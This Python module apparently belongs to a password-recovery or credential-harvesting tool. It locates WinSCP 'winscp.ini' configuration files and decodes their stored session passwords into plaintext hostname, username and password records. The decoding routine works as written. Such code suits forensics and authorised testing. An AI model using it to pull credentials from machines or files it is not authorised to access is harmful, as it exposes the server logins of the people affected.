# -*- coding: utf-8 -*-
import re
import os
import urllib
import random
import configparser

from core.utils import sectionToMap

def match(filename):
    return os.path.basename(filename).lower() == 'winscp.ini'

def run(filename):
    result     = []
    Config     = configparser.ConfigParser(strict = False)
    Config.read(filename)
    
    for section in Config.sections():
        item = sectionToMap(Config, section)

        if 'username' in item and 'hostname' in item and 'password' in item:
            if 'portnumber' not in item:
                item['portnumber'] = 22

            item['password'] = decrypt_password(item['password'], item['username'] + item['hostname'])

            result.append({
                'type': 'credentials',
                'data': {
                    'hostname': item['hostname'],
                    'username': item['username'],
                    'password': item['password']
                }
            })

    return result

# WINSCP helper

PWALG_SIMPLE          = 1
PWALG_SIMPLE_MAGIC    = 0xA3
PWALG_SIMPLE_STRING   = '0123456789ABCDEF'
PWALG_SIMPLE_MAXLEN   = 50
PWALG_SIMPLE_FLAG     = 0xFF
PWALG_SIMPLE_INTERNAL = 0x00

# def simple_encrypt_char(char):
#     char = ~char ^ PWALG_SIMPLE_MAGIC
#     a = (char & 0xF0) >> 4
#     b = (char & 0x0F) >> 0
#     return PWALG_SIMPLE_STRING[a] + PWALG_SIMPLE_STRING[b]

def simple_decrypt_next_char(password_list):
    if len(password_list) <= 0:
        return 0x00
    a = PWALG_SIMPLE_STRING.find(password_list.pop(0))
    b = PWALG_SIMPLE_STRING.find(password_list.pop(0))
    return 0xff & ~(((a << 4) + b << 0) ^ PWALG_SIMPLE_MAGIC)

# def encrypt_password(password, key):
#     """
#     encrypt_password('helloworld123', 'root'+'120.24.61.91')
#     """
#     password = key + password
#     if len(password) < PWALG_SIMPLE_MAXLEN:
#         shift = random.randint(0, PWALG_SIMPLE_MAXLEN - len(password))
#     else:
#         shift = 0
#     result = ''
#     result += simple_encrypt_char(PWALG_SIMPLE_FLAG)
#     result += simple_encrypt_char(PWALG_SIMPLE_INTERNAL)
#     result += simple_encrypt_char(len(password))
#     result += simple_encrypt_char(shift)
#     for i in range(shift):
#         result += simple_encrypt_char(random.randint(0, 256))
#     for i in password:
#         result += simple_encrypt_char(ord(i))
#     while len(result) < PWALG_SIMPLE_MAXLEN * 2:
#         result += simple_encrypt_char(random.randint(0, 256))
#     return result

def decrypt_password(password, key):
    """
    decrypt_password(encrypt_password, 'root'+'120.24.61.91')
    """
    if not password or not key:
        return ''
    password = list(password)
    flag = simple_decrypt_next_char(password)
    if flag == PWALG_SIMPLE_FLAG:
        _ = simple_decrypt_next_char(password)
        length = simple_decrypt_next_char(password)
    else:
        length = flag
    password = password[int(simple_decrypt_next_char(password)) * 2:]
    result = ''
    for i in range(length):
        result += chr(simple_decrypt_next_char(password))
    # print result
    if flag == PWALG_SIMPLE_FLAG:
        if result[:len(key)] != key:
            result = ''
        else:
            result = result[len(key):]
    return result
